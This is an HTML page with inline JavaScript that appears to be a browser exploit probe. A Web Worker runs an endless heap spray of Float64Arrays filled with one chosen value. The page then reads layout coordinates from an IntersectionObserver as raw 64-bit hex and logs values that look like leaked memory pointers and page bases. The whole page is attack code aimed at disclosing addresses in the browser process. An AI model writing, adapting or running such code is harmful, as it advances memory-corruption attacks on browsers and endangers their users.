<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0; font-family:monospace; height: 5000px; overflow: hidden;">
    <h3 style="color:#0ff">T239_POINTER_STABILIZER_v157.0</h3>
    <hr style="border:1px solid #0ff">
    <div id="target" style="width:20px; height:20px; background:red; position:absolute; top:200px; left:50%;"></div>
    <div id="out" style="font-size: 11px; line-height: 1.3;">STATUS: STABILIZING_CYAN_POINTERS...</div>

    <script>
        const log = (m, color="#0f0") => {
            const out = document.getElementById('out');
            out.innerHTML = `<span style="color:${color}">> ${m}</span><br>` + out.innerHTML.slice(0, 1200);
        };
        const target = document.getElementById('target');
        let trapped = false;

        function floatToHex(f) {
            const buf = new ArrayBuffer(8);
            (new Float64Array(buf))[0] = f;
            const view = new Uint32Array(buf);
            return "0x" + view[1].toString(16).padStart(8, '0') + view[0].toString(16).padStart(8, '0');
        }

        const worker = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function() {
                const MAX_PAGES = 3000;
                let pool = [];
                while(true) {
                    for(let i=0; i<50; i++) pool.push(new Float64Array(1024).fill(1.4916681462400413e-154));
                    if(pool.length > MAX_PAGES) pool.splice(0, 100);
                }
            }
        `])));
        worker.postMessage("s");

        const observer = new IntersectionObserver((entries) => {
            if (trapped) return;
            for (let entry of entries) {
                const hex = floatToHex(entry.boundingClientRect.top);

                if (hex.startsWith("0x3") || hex.startsWith("0xb") || hex.startsWith("0xc") || hex.startsWith("0x7")) {
                    // Calculate the Page Base (masking the last 3 digits)
                    const base = hex.slice(0, -3) + "000";
                    log(`STABILIZED_BASE: ${base} (from ${hex})`, "#0ff");
                } 
                else if (hex.startsWith("0x0000") && hex !== "0x0000000000000000") {
                    trapped = true;
                    log(`!!! ABSOLUTE_CODE_HIT: ${hex} !!!`, "#fff");
                    target.style.background = "#fff";
                }
                else if (!hex.startsWith("0x4069")) {
                    log(`DATA: ${hex}`, "#006600");
                }
            }
        }, { root: null, threshold: Array.from({length: 120}, (_, i) => i / 120) });

        observer.observe(target);
        setInterval(() => { if(!trapped) target.style.top = (200 + Math.random()) + "px"; }, 12);
    </script>
</body>
</html>
